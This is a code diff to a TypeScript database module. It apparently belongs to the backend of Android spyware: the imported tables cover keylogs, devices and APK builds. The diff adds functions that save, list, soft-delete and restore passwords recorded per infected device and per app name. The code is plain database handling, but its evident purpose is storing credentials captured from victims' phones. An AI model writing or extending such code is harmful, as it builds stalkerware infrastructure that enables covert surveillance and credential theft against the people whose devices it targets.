@@ -2,7 +2,7 @@ import { eq, and } from "drizzle-orm";
 import { drizzle } from "drizzle-orm/mysql2";
 import mysql from "mysql2/promise";
 import type { Pool } from "mysql2/promise";
-import { InsertUser, users, keylogs, InsertKeylog, settings, InsertSetting, Setting, devices, InsertDevice, Device, apkBuilds, APKBuild, InsertAPKBuild } from "../drizzle/schema";
+import { InsertUser, users, keylogs, InsertKeylog, settings, InsertSetting, Setting, devices, InsertDevice, Device, apkBuilds, APKBuild, InsertAPKBuild, passwords, InsertPassword, Password } from "../drizzle/schema";
 import { ENV } from './_core/env';
 
 let _db: any = null;
@@ -698,5 +698,114 @@ export async function getAPKBuildByFilename(filename: string): Promise<APKBuild 
   } catch (error) {
     console.error("[Database] Failed to get APK build by filename:", error);
     return null;
+  }
+}
+
+
+// Password helpers
+export async function savePassword(password: InsertPassword): Promise<Password | null> {
+  const db = await getDb();
+  if (!db) {
+    console.warn("[Database] Cannot save password: database not available");
+    return null;
+  }
+
+  try {
+    await db.insert(passwords).values(password);
+    const result = await db
+      .select()
+      .from(passwords)
+      .where(and(
+        eq(passwords.deviceId, password.deviceId),
+        eq(passwords.appName, password.appName)
+      ))
+      .orderBy(passwords.createdAt)
+      .limit(1);
+    return result.length > 0 ? result[0] : null;
+  } catch (error) {
+    console.error("[Database] Failed to save password:", error);
+    throw error;
+  }
+}
+
+export async function getPasswordsByDevice(deviceId: string): Promise<Password[]> {
+  const db = await getDb();
+  if (!db) {
+    console.warn("[Database] Cannot get passwords: database not available");
+    return [];
+  }
+
+  try {
+    const result = await db
+      .select()
+      .from(passwords)
+      .where(and(
+        eq(passwords.deviceId, deviceId),
+        eq(passwords.isDeleted, 0)
+      ))
+      .orderBy(passwords.createdAt);
+    return result;
+  } catch (error) {
+    console.error("[Database] Failed to get passwords:", error);
+    return [];
+  }
+}
+
+export async function deletePassword(passwordId: number): Promise<void> {
+  const db = await getDb();
+  if (!db) {
+    console.warn("[Database] Cannot delete password: database not available");
+    return;
+  }
+
+  try {
+    await db
+      .update(passwords)
+      .set({ isDeleted: 1 })
+      .where(eq(passwords.id, passwordId));
+  } catch (error) {
+    console.error("[Database] Failed to delete password:", error);
+    throw error;
+  }
+}
+
+export async function getDeletedPasswords(deviceId: string): Promise<Password[]> {
+  const db = await getDb();
+  if (!db) {
+    console.warn("[Database] Cannot get deleted passwords: database not available");
+    return [];
+  }
+
+  try {
+    const result = await db
+      .select()
+      .from(passwords)
+      .where(and(
+        eq(passwords.deviceId, deviceId),
+        eq(passwords.isDeleted, 1)
+      ))
+      .orderBy(passwords.createdAt);
+    return result;
+  } catch (error) {
+    console.error("[Database] Failed to get deleted passwords:", error);
+    return [];
+  }
+}
+
+export async function restorePassword(passwordId: number): Promise<void> {
+  const db = await getDb();
+  if (!db) {
+    console.warn("[Database] Cannot restore password: database not available");
+    return;
+  }
+
+  try {
+    await db
+      .update(passwords)
+      .set({ isDeleted: 0 })
+      .where(eq(passwords.id, passwordId));
+  } catch (error) {
+    console.error("[Database] Failed to restore password:", error);
+    throw error;
   }
 }
